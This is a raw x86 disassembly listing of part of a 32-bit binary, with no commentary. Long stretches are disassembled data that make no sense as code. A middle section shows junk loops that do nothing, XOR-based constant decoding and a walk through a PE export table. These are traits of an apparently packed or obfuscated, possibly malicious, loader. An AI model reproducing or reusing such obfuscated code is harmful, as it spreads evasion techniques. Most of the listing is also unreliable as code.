  4071f1:	add    DWORD PTR [edi],ecx
  4071f3:	sbb    BYTE PTR [ebx],0x5
  4071f6:	cmp    DWORD PTR [edi-0x7c],edx
  4071f9:	add    eax,0x8ff39759
  4071fe:	xor    DWORD PTR [edi],edx
  407200:	sbb    edx,DWORD PTR [eax-0x55]
  407203:	push   edx
  407204:	mov    eax,0x26962233
  407209:	ins    BYTE PTR es:[edi],dx
  40720a:	lahf   
  40720b:	sbb    BYTE PTR [ecx-0x48],dh
  40720e:	fwait
  40720f:	dec    edx
  407210:	pop    ds
  407211:	jge    0x4071ef
  407213:	jnp    0x407283
  407215:	(bad)  
  407216:	mov    dl,0xc1
  407218:	ror    BYTE PTR [edi],cl
  40721a:	fisub  DWORD PTR [ebx+0x5f6c291a]
  407220:	jp     0x4071ea
  407222:	sar    eax,cl
  407224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407225:	sbb    BYTE PTR [ecx],cl
  407227:	rcr    BYTE PTR [edx+0x2c],0x46
  40722b:	sub    BYTE PTR [ecx],ah
  40722d:	mov    ecx,0xea7792fe
  407232:	imul   esp,DWORD PTR [ecx+0xb3bda62],0x24232b7c
  40723c:	icebp  
  40723d:	inc    eax
  40723e:	jno    0x4071dc
  407240:	call   0x4351:0xc86afa2f
  407247:	add    eax,eax
  407249:	or     DWORD PTR [ecx],edx
  40724b:	(bad)  
  40724c:	ret    0x45e0
  40724f:	and    dh,BYTE PTR [edx+0x56357861]
  407255:	sub    eax,DWORD PTR [esi]
  407257:	inc    esi
  407258:	ds adc DWORD PTR ds:0xfd7cded6,esi
  407260:	mov    ch,0x95
  407262:	inc    esp
  407263:	rcr    esi,cl
  407265:	pop    edi
  407266:	imul   edx,esi,0xffffffbd
  407269:	(bad)  
  40726a:	jbe    0x407220
  40726c:	cmc    
  40726d:	retf   0x10b0
  407270:	loop   0x407275
  407272:	ins    BYTE PTR es:[edi],dx
  407273:	xor    DWORD PTR [ebx+0x12eaca4b],edi
  407279:	jb     0x407245
  40727b:	jle    0x4072e6
  40727d:	mov    eax,ds:0x991e1952
  407282:	popf   
  407283:	scas   eax,DWORD PTR es:[edi]
  407284:	std    
  407285:	popf   
  407286:	dec    edx
  407287:	aam    0x2d
  407289:	popf   
  40728a:	xchg   esp,eax
  40728b:	xchg   esp,eax
  40728c:	gs in  eax,0xd8
  40728f:	jae    0x407292
  407291:	jb     0x4072a7
  407293:	js     0x40730c
  407295:	leave  
  407296:	and    edi,DWORD PTR [ebp+0x5f]
  407299:	mov    DWORD PTR [ebx-0x6877f5df],edi
  40729f:	pop    ecx
  4072a0:	jmp    0xc633e131
  4072a5:	xor    eax,0x3cffe076
  4072aa:	push   es
  4072ab:	mov    ebp,0x6fe4a244
  4072b0:	stc    
  4072b1:	mov    al,BYTE PTR [eax-0x65f01d55]
  4072b7:	into   
  4072b8:	adc    DWORD PTR [esi-0x7dc37c97],ebp
  4072be:	into   
  4072bf:	aas    
  4072c0:	jnp    0x40733d
  4072c2:	or     edi,DWORD PTR ds:0xb44bf5b7
  4072c8:	inc    ebp
  4072c9:	daa    
  4072ca:	iret   
  4072cb:	xchg   edi,eax
  4072cc:	imul   esi,DWORD PTR [edi+0x3a],0x67
  4072d0:	cmp    ebx,ebp
  4072d2:	inc    ebx
  4072d3:	pop    esp
  4072d4:	outs   dx,BYTE PTR ds:[esi]
  4072d5:	repnz dec ecx
  4072d7:	mov    ebx,DWORD PTR [esi-0x62296094]
  4072dd:	fimul  WORD PTR [edi]
  4072df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072e0:	pop    bx
  4072e2:	cmp    DWORD PTR [ebx+0x67],0xffffffb6
  4072e6:	in     eax,0x79
  4072e8:	and    BYTE PTR [esi-0x4],cl
  4072eb:	cmp    eax,0xf795983a
  4072f0:	loop   0x4072eb
  4072f2:	push   0xffffffc8
  4072f4:	sub    bl,BYTE PTR [ecx]
  4072f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072f7:	imul   ecx,DWORD PTR [edx*4-0x274b2c94],0x65
  4072ff:	cmp    al,0x96
  407301:	sar    BYTE PTR [edi+0xa495505],1
  407307:	test   al,0x96
  407309:	in     al,dx
  40730a:	jle    0x4072e0
  40730c:	jg     0x407346
  40730e:	cli    
  40730f:	dec    eax
  407310:	pusha  
  407311:	dec    ebp
  407312:	push   ss
  407313:	sub    dh,BYTE PTR [ebp-0x10]
  407316:	scas   eax,DWORD PTR es:[edi]
  407317:	into   
  407318:	cld    
  407319:	aas    
  40731a:	jg     0x4072d6
  40731c:	add    DWORD PTR [eax],edi
  40731e:	add    al,0xad
  407320:	jl     0x4072f5
  407322:	cmp    eax,edi
  407324:	cmp    DWORD PTR [ecx],ecx
  407326:	fldenv [ecx+ebx*1-0x14]
  40732a:	test   eax,0x3fb94669
  40732f:	cs push es
  407331:	push   cs
  407332:	(bad)  
  407333:	aaa    
  407334:	or     BYTE PTR [edi+0x48],0xb6
  407338:	and    ch,BYTE PTR [ebp+0x2f]
  40733b:	mov    ecx,DWORD PTR ds:0x679218f3
  407341:	or     BYTE PTR [ebx+0xf813a7c],cl
  407347:	retf   0xdf7b
  40734a:	leave  
  40734b:	cld    
  40734c:	leave  
  40734d:	xlat   BYTE PTR ds:[ebx]
  40734e:	dec    edi
  40734f:	push   0x50
  407351:	gs sbb esp,eax
  407354:	push   ss
  407355:	in     eax,0x55
  407357:	not    bl
  407359:	mov    esi,0xd174116c
  40735e:	sub    al,0x2b
  407360:	sbb    bh,BYTE PTR [esi-0x92ae7af]
  407366:	or     edi,ebp
  407368:	and    ch,BYTE PTR [edi]
  40736a:	cmp    BYTE PTR [edi],ch
  40736c:	jb     0x407387
  40736e:	retf   
  40736f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407370:	aaa    
  407371:	sbb    eax,0x6e34fe87
  407376:	jmp    0xd25329ff
  40737b:	push   0xd0bdbceb
  407380:	dec    esp
  407381:	cdq    
  407382:	xchg   edx,eax
  407383:	mov    dl,0x4c
  407385:	int    0x5b
  407387:	lock sbb eax,0xd63750a3
  40738d:	or     edi,DWORD PTR [esi]
  40738f:	(bad)  
  407390:	mov    ebx,0x164e2744
  407395:	mov    al,ds:0xbc566902
  40739a:	fst    st(4)
  40739c:	adc    DWORD PTR [eax-0x33263493],edi
  4073a2:	cmp    cl,BYTE PTR [esi+0x74]
  4073a5:	lods   al,BYTE PTR ds:[esi]
  4073a6:	dec    di
  4073a8:	scas   al,BYTE PTR es:[edi]
  4073a9:	and    eax,0x427a7832
  4073ae:	frstor ss:[edi+0x7e]
  4073b2:	jae    0x4073a5
  4073b4:	lahf   
  4073b5:	jp     0x407358
  4073b7:	int    0xd5
  4073b9:	mov    WORD PTR [ebx+0x743d4ed5],?
  4073bf:	inc    eax
  4073c0:	pop    ebx
  4073c1:	pop    eax
  4073c2:	mov    ch,0xb5
  4073c4:	std    
  4073c5:	mov    bl,0x82
  4073c7:	aad    0xa1
  4073c9:	push   eax
  4073ca:	inc    esi
  4073cb:	inc    edx
  4073cc:	or     eax,DWORD PTR [edi]
  4073ce:	scas   al,BYTE PTR es:[edi]
  4073cf:	xchg   esi,eax
  4073d0:	dec    edi
  4073d1:	popf   
  4073d2:	call   0xcbb3:0x5a5520d
  4073d9:	dec    ecx
  4073da:	xor    al,0xc0
  4073dc:	and    esp,eax
  4073de:	xor    eax,0x45c88538
  4073e3:	mov    ds:0x8086455b,eax
  4073e8:	mov    al,0xe7
  4073ea:	mov    dh,0xb1
  4073ec:	mov    ch,0xd3
  4073ee:	test   DWORD PTR [ebp-0x598dfd63],edi
  4073f4:	jae    0x407382
  4073f6:	xor    ecx,ebx
  4073f8:	arpl   WORD PTR [ebp+0xb],cx
  4073fb:	dec    esp
  4073fc:	pop    ds
  4073fd:	mov    esp,0xac3def77
  407402:	mov    dh,0x87
  407404:	scas   al,BYTE PTR es:[edi]
  407405:	and    DWORD PTR [eax-0x6b],0x67db40bf
  40740c:	sbb    eax,0x710a3c9
  407411:	xor    esp,DWORD PTR [ebp+0x2b62a4c6]
  407417:	xchg   ecx,eax
  407418:	adc    BYTE PTR [ebx+ecx*4],cl
  40741b:	jnp    0x4073d1
  40741d:	sbb    eax,0x97c1ff7c
  407422:	xlat   BYTE PTR ds:[ebx]
  407423:	push   esp
  407424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407425:	pop    ss
  407426:	sub    DWORD PTR [edx],ebx
  407428:	ds (bad) 
  40742a:	pop    ds
  40742b:	xchg   ecx,eax
  40742c:	jmp    DWORD PTR [ebp+0x18653d98]
  407432:	cmp    cl,BYTE PTR [ebp+ebp*8-0x5e2e68be]
  407439:	(bad)  
  40743a:	ins    BYTE PTR es:[edi],dx
  40743b:	mov    edx,0x79a66d9e
  407440:	stos   DWORD PTR es:[edi],eax
  407441:	mov    al,ds:0xb88d65b9
  407446:	sub    ecx,ecx
  407448:	bound  esi,QWORD PTR [edi-0x42]
  40744b:	test   BYTE PTR [edi],cl
  40744d:	xor    eax,0x45a68ef3
  407452:	xor    dl,BYTE PTR [edx+0x52589af0]
  407458:	jae    0x4074c9
  40745a:	(bad)  
  40745b:	fstp   QWORD PTR [eax-0x3a]
  40745e:	in     eax,0x35
  407460:	and    al,0xf
  407462:	fild   QWORD PTR [edi+eax*2]
  407465:	fnstenv [ebx]
  407467:	mov    cl,0x32
  407469:	add    BYTE PTR [ebp+0x44869c40],ch
  40746f:	push   cs
  407470:	mov    WORD PTR [edi],gs
  407472:	and    BYTE PTR [ebp+0x3ff8b814],ah
  407478:	mov    DWORD PTR [ebx+eiz*8-0x38db6183],ecx
  40747f:	(bad)  
  407480:	int3   
  407481:	dec    ebx
  407482:	jne    0x40742c
  407484:	and    ecx,DWORD PTR [edi-0x60]
  407487:	ret    
  407488:	int    0xe1
  40748a:	aas    
  40748b:	mov    esp,DWORD PTR [esi-0x4dd5ae86]
  407491:	dec    ecx
  407492:	out    dx,eax
  407493:	mov    al,ds:0x7b02e264
  407498:	sbb    eax,0x79e9e266
  40749d:	shr    DWORD PTR [edx-0x10ad9c67],0xbf
  4074a4:	push   ds
  4074a5:	test   BYTE PTR [ecx+0x5a],bl
  4074a8:	das    
  4074a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074aa:	mov    ds:0x7948863,eax
  4074af:	inc    esi
  4074b0:	cli    
  4074b1:	push   edi
  4074b2:	and    dl,BYTE PTR [edi-0x1369a20d]
  4074b8:	(bad)  
  4074b9:	sub    bh,BYTE PTR [ecx-0x574d05a0]
  4074bf:	stos   DWORD PTR es:[edi],eax
  4074c0:	daa    
  4074c1:	cmp    DWORD PTR [edx-0x58ac7de6],ecx
  4074c7:	sbb    ah,bh
  4074c9:	mov    bh,0x8b
  4074cb:	xchg   esi,eax
  4074cc:	ret    0x905c
  4074cf:	mov    al,0x57
  4074d1:	cmovne esi,eax
  4074d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d5:	adc    eax,0xb1bfc0b6
  4074da:	es pop es
  4074dc:	in     eax,dx
  4074dd:	add    ah,BYTE PTR [esi]
  4074df:	stos   BYTE PTR es:[edi],al
  4074e0:	xchg   ebp,eax
  4074e1:	xchg   edi,eax
  4074e2:	push   0xa1105161
  4074e7:	inc    edx
  4074e8:	aaa    
  4074e9:	xor    DWORD PTR [eax-0x5d],0x6
  4074ed:	loopne 0x407524
  4074ef:	(bad)  
  4074f0:	out    dx,eax
  4074f1:	jnp    0x407541
  4074f3:	jmp    0x49feb372
  4074f8:	ds cmc 
  4074fa:	jl     0x4074ff
  4074fc:	pop    eax
  4074fd:	cmp    DWORD PTR [ebp-0xf3b51a2],ebx
  407503:	into   
  407504:	mov    ecx,0xb5607d56
  407509:	(bad)  
  40750a:	mov    bl,0xb
  40750c:	ret    
  40750d:	arpl   WORD PTR [ebx+0x72],ax
  407510:	mov    DWORD PTR [ebx-0x42],edx
  407513:	sbb    BYTE PTR [esi+0x1cc111ff],dl
  407519:	inc    ebx
  40751a:	cmc    
  40751b:	test   ecx,esp
  40751d:	stc    
  40751e:	je     0x407535
  407520:	mov    ?,edx
  407522:	xchg   edi,eax
  407523:	scas   al,BYTE PTR es:[edi]
  407524:	sar    DWORD PTR [edx-0x54],1
  407527:	pop    esi
  407528:	int3   
  407529:	mov    bh,0xa3
  40752b:	retf   
  40752c:	mov    eax,0xde199b38
  407531:	adc    DWORD PTR [eax+0x28],edx
  407534:	xchg   ebp,eax
  407535:	in     al,dx
  407536:	enter  0xdeec,0x44
  40753a:	xor    eax,0xfe824b38
  40753f:	or     DWORD PTR [eax+0x61],ebx
  407542:	and    edx,DWORD PTR [ebp-0x4fe6fa25]
  407548:	scas   eax,DWORD PTR es:[edi]
  407549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40754a:	adc    eax,0xaf197d50
  40754f:	outs   dx,DWORD PTR ds:[esi]
  407550:	daa    
  407551:	hlt    
  407552:	imul   edx,DWORD PTR [edx+eax*1-0x25],0xcd35bb5d
  40755a:	or     dl,bl
  40755c:	in     eax,0x1d
  40755e:	sub    dh,bh
  407560:	add    ch,BYTE PTR es:[edx]
  407563:	loop   0x407565
  407565:	stos   BYTE PTR es:[edi],al
  407566:	gs (bad) 
  407569:	jg     0x407542
  40756b:	adc    BYTE PTR [edi+0x1263effb],ah
  407571:	mov    dl,0x5b
  407573:	es ror BYTE PTR cs:[ebp-0x7fe909a6],0xbc
  40757c:	popf   
  40757d:	or     eax,0x6842aeea
  407582:	imul   ebp
  407584:	cmp    edi,DWORD PTR ds:0x7d0659c3
  40758a:	(bad)  
  40758b:	fs xor eax,0xf8bcd8f3
  407591:	mov    ds:0x365c9b52,eax
  407596:	(bad)  
  407597:	popf   
  407598:	mov    edi,0xc964a8c5
  40759d:	pop    esp
  40759e:	mov    ecx,0xf0d9c174
  4075a3:	call   0x9cd8912c
  4075a8:	lods   al,BYTE PTR ds:[esi]
  4075a9:	mov    bh,0xa6
  4075ab:	inc    eax
  4075ac:	cdq    
  4075ad:	sbb    eax,0x1bae4e1b
  4075b2:	je     0x40758d
  4075b4:	cmc    
  4075b5:	and    BYTE PTR [ebx+eax*8],0x8f
  4075b9:	daa    
  4075ba:	scas   al,BYTE PTR es:[edi]
  4075bb:	xor    al,0x67
  4075bd:	in     eax,dx
  4075be:	stos   BYTE PTR es:[edi],al
  4075bf:	inc    esi
  4075c0:	scas   al,BYTE PTR es:[edi]
  4075c1:	lock iret 
  4075c3:	in     al,0x83
  4075c5:	test   eax,0xb4263c42
  4075ca:	cmp    bp,WORD PTR [ecx-0x1a]
  4075ce:	in     eax,0xfc
  4075d0:	out    0xf1,al
  4075d2:	inc    edx
  4075d3:	inc    esp
  4075d4:	inc    ecx
  4075d5:	movlps xmm2,QWORD PTR [esi+edx*2-0x3d]
  4075da:	in     eax,0x54
  4075dc:	xchg   DWORD PTR [eax+0x3c],ecx
  4075df:	inc    ebp
  4075e0:	(bad)  
  4075e1:	fst    DWORD PTR ds:0xb26fdcbc
  4075e7:	or     ecx,ebx
  4075e9:	shl    DWORD PTR [esi+ebp*4+0x55],cl
  4075ed:	out    dx,eax
  4075ee:	mov    esp,0x24184489
  4075f3:	and    ebx,eax
  4075f5:	fsub   DWORD PTR [ebx+0x45]
  4075f8:	cdq    
  4075f9:	loope  0x407648
  4075fb:	inc    esi
  4075fc:	cmp    DWORD PTR [edi+0x2de8da48],eax
  407602:	cmp    BYTE PTR [esi+0x9e42325],ah
  407608:	pop    es
  407609:	pop    ecx
  40760a:	sbb    DWORD PTR [ebp+0x23b772fc],esi
  407610:	pop    eax
  407611:	push   ecx
  407612:	call   DWORD PTR [edx]
  407614:	or     eax,0x1f80b377
  407619:	or     eax,0x50316b95
  40761e:	call   0x723fd2e4
  407623:	push   ds
  407624:	aaa    
  407625:	inc    esp
  407626:	js     0x407646
  407628:	xchg   edx,eax
  407629:	cli    
  40762a:	dec    edx
  40762b:	repnz xor DWORD PTR [eax],0x4e
  40762f:	xchg   ebp,eax
  407630:	mov    BYTE PTR [esi+0x6b],0x7e
  407634:	(bad)  
  407635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407636:	in     al,dx
  407637:	test   BYTE PTR [ebp+0x1b3ed4b3],0x1c
  40763e:	push   0xffffffdf
  407640:	dec    ebx
  407641:	pop    es
  407642:	icebp  
  407643:	cwde   
  407644:	sub    DWORD PTR [ebp-0x2891a30f],ebx
  40764a:	mov    al,ds:0x8e38a09
  40764f:	dec    ecx
  407650:	jecxz  0x4076a4
  407652:	sbb    BYTE PTR [edi-0x18],ch
  407655:	lea    esi,[eax+0x69981a0b]
  40765b:	ds mov eax,0x57288fe7
  407661:	inc    esp
  407662:	mov    ebx,0x52655b11
  407667:	pop    es
  407668:	push   es
  407669:	leave  
  40766a:	push   0x434
  40766f:	or     DWORD PTR ds:0x429018,0x42b014
  407679:	push   0x98678765
  40767e:	call   DWORD PTR ds:0x42ec63
  407684:	adc    eax,DWORD PTR ds:0x42d008
  40768a:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  407691:	add    DWORD PTR ds:0x429024,0x6cdb
  40769b:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4076a2:	neg    eax
  4076a4:	mov    eax,DWORD PTR [ebp-0x4]
  4076a7:	mov    esi,0x7510899
  4076ac:	dec    DWORD PTR ds:0x42c014
  4076b2:	xor    eax,esi
  4076b4:	and    DWORD PTR ds:0x42d010,ebx
  4076ba:	mov    edi,0x3272e0
  4076bf:	and    DWORD PTR ds:0x42c00c,0x622d
  4076c9:	add    eax,edi
  4076cb:	mov    DWORD PTR [ebp-0x1c],eax
  4076ce:	sub    DWORD PTR ds:0x42a008,ecx
  4076d4:	mov    eax,DWORD PTR [ebp+0x14]
  4076d7:	test   eax,eax
  4076d9:	je     0x407700
  4076df:	and    eax,DWORD PTR ds:0x42c010
  4076e5:	mov    eax,DWORD PTR [ebp+0x14]
  4076e8:	movzx  ebx,BYTE PTR ds:0x42a010
  4076ef:	sub    ebx,DWORD PTR ds:0x42b000
  4076f5:	mov    DWORD PTR ds:0x42a010,ebx
  4076fb:	mov    eax,DWORD PTR [eax]
  4076fd:	mov    DWORD PTR [ebp-0x1c],eax
  407700:	mov    eax,DWORD PTR [ebp-0x4]
  407703:	xor    DWORD PTR ds:0x42a01c,0x6981
  40770d:	xor    eax,esi
  40770f:	dec    ebx
  407710:	add    eax,edi
  407712:	sbb    ebx,0x28a0
  407718:	mov    DWORD PTR [ebp-0x8],eax
  40771b:	xor    eax,0x6e91
  407720:	mov    eax,DWORD PTR [ebp-0xc]
  407723:	neg    ebx
  407725:	xor    eax,esi
  407727:	and    DWORD PTR ds:0x429004,0x0
  407731:	jmp    0x407743
  407736:	mov    ebx,DWORD PTR ds:0x429004
  40773c:	inc    ebx
  40773d:	mov    DWORD PTR ds:0x429004,ebx
  407743:	cmp    DWORD PTR ds:0x429004,0x17
  40774a:	jae    0x40776d
  407750:	cmp    DWORD PTR ds:0x429004,0x22
  407757:	jne    0x407768
  40775d:	push   0x42d014
  407762:	call   DWORD PTR ds:0x42ec8b
  407768:	jmp    0x407736
  40776d:	add    eax,edi
  40776f:	mov    DWORD PTR [ebp-0x2c],eax
  407772:	mov    eax,DWORD PTR [ebp-0x4]
  407775:	adc    ebx,DWORD PTR ds:0x42c01c
  40777b:	xor    eax,esi
  40777d:	add    eax,edi
  40777f:	sbb    DWORD PTR ds:0x42c008,edi
  407785:	mov    DWORD PTR [ebp-0x38],eax
  407788:	and    DWORD PTR ds:0x42a000,0x0
  407792:	jmp    0x4077a2
  407797:	mov    eax,ds:0x42a000
  40779c:	inc    eax
  40779d:	mov    ds:0x42a000,eax
  4077a2:	cmp    DWORD PTR ds:0x42a000,0x1d
  4077a9:	jae    0x4077fc
  4077af:	cmp    DWORD PTR ds:0x42a000,0xc
  4077b6:	jne    0x4077d3
  4077bc:	push   0x27ff
  4077c1:	push   0x1
  4077c3:	push   0x42a000
  4077c8:	push   0x69ee
  4077cd:	call   DWORD PTR ds:0x42ec8f
  4077d3:	cmp    DWORD PTR ds:0x42a000,0xb
  4077da:	jne    0x4077eb
  4077e0:	mov    eax,ds:0x42a000
  4077e5:	inc    eax
  4077e6:	mov    ds:0x42a000,eax
  4077eb:	jmp    0x407797
  4077f0:	mov    ebx,DWORD PTR ds:0x42a004
  4077f6:	sbb    DWORD PTR ds:0x429004,ebx
  4077fc:	mov    ebx,DWORD PTR [ebp-0x4]
  4077ff:	xor    ebx,esi
  407801:	sbb    DWORD PTR ds:0x42900c,ebx
  407807:	add    ebx,edi
  407809:	mov    eax,DWORD PTR [ebp-0x2c]
  40780c:	add    DWORD PTR ds:0x42d004,0x19e2
  407816:	sub    eax,edi
  407818:	lea    ecx,[ebx-0x3272e0]
  40781e:	add    DWORD PTR ds:0x42a01c,0x7b3b
  407828:	xor    eax,esi
  40782a:	xor    DWORD PTR ds:0x42c01c,0x2532
  407834:	xor    ecx,esi
  407836:	mov    DWORD PTR ds:0x42b014,0x5b4d
  407840:	cmp    ecx,eax
  407842:	mov    DWORD PTR ds:0x42b008,0x5311
  40784c:	je     0x409eee
  407852:	mov    eax,ds:0x418f51
  407857:	mov    eax,DWORD PTR [eax]
  407859:	adc    DWORD PTR ds:0x429018,eax
  40785f:	mov    eax,DWORD PTR [ebp-0x4]
  407862:	adc    DWORD PTR ds:0x42d008,0x42a004
  40786c:	xor    eax,esi
  40786e:	adc    DWORD PTR ds:0x42a008,0x6af5
  407878:	add    eax,edi
  40787a:	cmp    ebx,eax
  40787c:	mov    DWORD PTR ds:0x42b008,0x1a7e
  407886:	jne    0x407b46
  40788c:	sub    DWORD PTR ds:0x42c008,0x42b00c
  407896:	push   DWORD PTR [ebp+0x8]
  407899:	xor    DWORD PTR ds:0x42c01c,0x42a018
  4078a3:	call   0x40514a
  4078a8:	mov    DWORD PTR ds:0x42a00c,0x1b
  4078b2:	cmp    DWORD PTR ds:0x42a00c,0x0
  4078b9:	je     0x407906
  4078bf:	cmp    DWORD PTR ds:0x42a00c,0xa
  4078c6:	jne    0x4078d2
  4078cc:	call   DWORD PTR ds:0x42ec93
  4078d2:	cmp    DWORD PTR ds:0x42a00c,0xb
  4078d9:	jne    0x4078ee
  4078df:	xor    ecx,ecx
  4078e1:	xor    ecx,DWORD PTR ds:0x42a00c
  4078e7:	dec    ecx
  4078e8:	mov    DWORD PTR ds:0x42a00c,ecx
  4078ee:	mov    ecx,DWORD PTR ds:0x42a00c
  4078f4:	dec    ecx
  4078f5:	mov    DWORD PTR ds:0x42a00c,ecx
  4078fb:	jmp    0x4078b2
  407900:	or     ecx,0x1d45
  407906:	mov    DWORD PTR [ebp-0x14],eax
  407909:	mov    eax,DWORD PTR [ebp-0x4]
  40790c:	mov    ecx,DWORD PTR [ebp-0x14]
  40790f:	xor    eax,esi
  407911:	dec    DWORD PTR ds:0x42901c
  407917:	add    eax,edi
  407919:	cmp    ecx,eax
  40791b:	je     0x40c2de
  407921:	and    DWORD PTR ds:0x42c000,0x7708
  40792b:	push   DWORD PTR [ebp-0x14]
  40792e:	push   DWORD PTR [ebp+0x8]
  407931:	xor    DWORD PTR ds:0x42a018,0x429008
  40793b:	call   0x40f0e2
  407940:	mov    DWORD PTR [ebp-0x14],eax
  407943:	and    DWORD PTR ds:0x429018,0x0
  40794d:	mov    eax,ds:0x429018
  407952:	inc    eax
  407953:	mov    ds:0x429018,eax
  407958:	cmp    DWORD PTR ds:0x429018,0x1e
  40795f:	jne    0x407987
  407965:	push   0x6c13
  40796a:	push   0x42d014
  40796f:	push   DWORD PTR [ebp-0x1c]
  407972:	push   0x4b90
  407977:	push   0x1e8a
  40797c:	push   0x4e24
  407981:	call   DWORD PTR ds:0x42ec97
  407987:	cmp    DWORD PTR ds:0x429018,0x14
  40798e:	jb     0x40794d
  407994:	mov    eax,DWORD PTR [ebp-0x4]
  407997:	mov    ecx,DWORD PTR [ebp-0x14]
  40799a:	xor    eax,esi
  40799c:	add    eax,edi
  40799e:	cmp    ecx,eax
  4079a0:	je     0x40c2de
  4079a6:	mov    DWORD PTR ds:0x42a008,0x19
  4079b0:	cmp    DWORD PTR ds:0x42a008,0x0
  4079b7:	je     0x4079e6
  4079bd:	cmp    DWORD PTR ds:0x42a008,0x24
  4079c4:	jne    0x4079d0
  4079ca:	call   DWORD PTR ds:0x42ec9b
  4079d0:	mov    eax,ds:0x42a008
  4079d5:	dec    eax
  4079d6:	mov    ds:0x42a008,eax
  4079db:	jmp    0x4079b0
  4079e0:	or     ecx,DWORD PTR ds:0x42b00c
  4079e6:	mov    eax,DWORD PTR [ebp-0x14]
  4079e9:	and    DWORD PTR ds:0x429000,0x0
  4079f3:	jmp    0x407a07
  4079f8:	xor    ecx,ecx
  4079fa:	or     ecx,DWORD PTR ds:0x429000
  407a00:	inc    ecx
  407a01:	mov    DWORD PTR ds:0x429000,ecx
  407a07:	cmp    DWORD PTR ds:0x429000,0x14
  407a0e:	jae    0x407a3d
  407a14:	cmp    DWORD PTR ds:0x429000,0x18
  407a1b:	jne    0x407a32
  407a21:	push   DWORD PTR [ebp-0x18]
  407a24:	push   0x42d000
  407a29:	push   DWORD PTR [ebp-0x1c]
  407a2c:	call   DWORD PTR ds:0x42ec9f
  407a32:	jmp    0x4079f8
  407a37:	xor    DWORD PTR ds:0x42b00c,ecx
  407a3d:	mov    eax,DWORD PTR [eax+0x18]
  407a40:	mov    DWORD PTR [ebp-0x2c],eax
  407a43:	mov    ecx,DWORD PTR ds:0x418f4d
  407a49:	mov    eax,ds:0x418f65
  407a4e:	sub    eax,ecx
  407a50:	and    ecx,DWORD PTR [ecx+eax*1]
  407a53:	mov    eax,DWORD PTR [ebp-0x14]
  407a56:	mov    ecx,DWORD PTR [ebp+0x8]
  407a59:	add    ecx,DWORD PTR [eax+0x20]
  407a5c:	mov    DWORD PTR ds:0x429014,0x11
  407a66:	cmp    DWORD PTR ds:0x429014,0x0
  407a6d:	je     0x407ac8
  407a73:	cmp    DWORD PTR ds:0x429014,0x9
  407a7a:	jne    0x407a93
  407a80:	push   0x42e127
  407a85:	push   0x42e111
  407a8a:	push   DWORD PTR [ebp-0x20]
  407a8d:	call   DWORD PTR ds:0x42eca7
  407a93:	cmp    DWORD PTR ds:0x429014,0xa
  407a9a:	jne    0x407aab
  407aa0:	mov    eax,ds:0x429014
  407aa5:	dec    eax
  407aa6:	mov    ds:0x429014,eax
  407aab:	xor    eax,eax
  407aad:	or     eax,DWORD PTR ds:0x429014
  407ab3:	dec    eax
  407ab4:	mov    ds:0x429014,eax
  407ab9:	jmp    0x407a66
  407abe:	and    DWORD PTR ds:0x42d000,0x2b86
  407ac8:	mov    DWORD PTR [ebp-0x34],ecx
  407acb:	xor    DWORD PTR ds:0x42a00c,edx
  407ad1:	mov    eax,DWORD PTR [ebp-0x14]
  407ad4:	and    DWORD PTR ds:0x429018,0x0
  407ade:	xor    ecx,ecx
  407ae0:	or     ecx,DWORD PTR ds:0x429018
  407ae6:	inc    ecx
  407ae7:	mov    DWORD PTR ds:0x429018,ecx
  407aed:	cmp    DWORD PTR ds:0x429018,0xa
  407af4:	jne    0x407b05
  407afa:	push   0x42e139
  407aff:	call   DWORD PTR ds:0x42ecab
  407b05:	cmp    DWORD PTR ds:0x429018,0x9
  407b0c:	jne    0x407b1f
  407b12:	mov    ecx,DWORD PTR ds:0x429018
  407b18:	inc    ecx
  407b19:	mov    DWORD PTR ds:0x429018,ecx
  407b1f:	cmp    DWORD PTR ds:0x429018,0x1e
  407b26:	jb     0x407ade
  407b2c:	mov    ecx,DWORD PTR [ebp+0x8]
  407b2f:	add    ecx,DWORD PTR [eax+0x24]
  407b32:	mov    DWORD PTR [ebp-0x3c],ecx
  407b35:	mov    eax,DWORD PTR [ebp-0x14]
  407b38:	mov    ecx,DWORD PTR [ebp+0x8]
  407b3b:	add    ecx,DWORD PTR [eax+0x1c]
  407b3e:	mov    DWORD PTR [ebp-0x14],ecx
  407b41:	jmp    0x409f21
  407b46:	mov    eax,DWORD PTR [ebp-0x34]
  407b49:	mov    ecx,DWORD PTR [ebp+0x8]
  407b4c:	add    ecx,DWORD PTR [eax+ebx*4]
  407b4f:	mov    DWORD PTR [ebp-0x30],ecx
  407b52:	mov    eax,DWORD PTR [ebp-0x4]
  407b55:	jmp    0x409eda
  407b5a:	icebp  
  407b5b:	pop    ebx
  407b5c:	call   DWORD PTR [edx-0x4408697d]
  407b62:	das    
  407b63:	sbb    DWORD PTR [eax],ecx
  407b65:	mov    bl,0x3b
  407b67:	xor    al,0x21
  407b69:	shr    DWORD PTR [edx+0x27a7a3c],cl
  407b6f:	pop    edi
  407b70:	jp     0x407bec
  407b72:	and    eax,0x9b754cd9
  407b77:	aam    0x34
  407b79:	jae    0x407bf4
  407b7b:	ficomp WORD PTR [eax+ebx*4-0x30]
  407b7f:	imul   ebp,DWORD PTR [ebp+0x5f3a837],0xbf6accff
  407b89:	imul   ecx,DWORD PTR [ebp-0xd2f34ea],0xffffffc0
  407b90:	pop    ebp
  407b91:	mov    ds:0x91a04ac9,eax
  407b96:	push   eax
  407b97:	add    al,0x1d
  407b99:	ja     0x407b1f
  407b9b:	in     eax,0x4d
  407b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b9e:	clc    
  407b9f:	jns    0x407c06
  407ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ba2:	gs dec esi
  407ba4:	outs   dx,BYTE PTR ds:[esi]
  407ba5:	mov    eax,0x6df1dc1f
  407baa:	hlt    
  407bab:	pcmpeqb mm7,QWORD PTR [ebp-0x74c70334]
  407bb2:	cmp    cl,ch
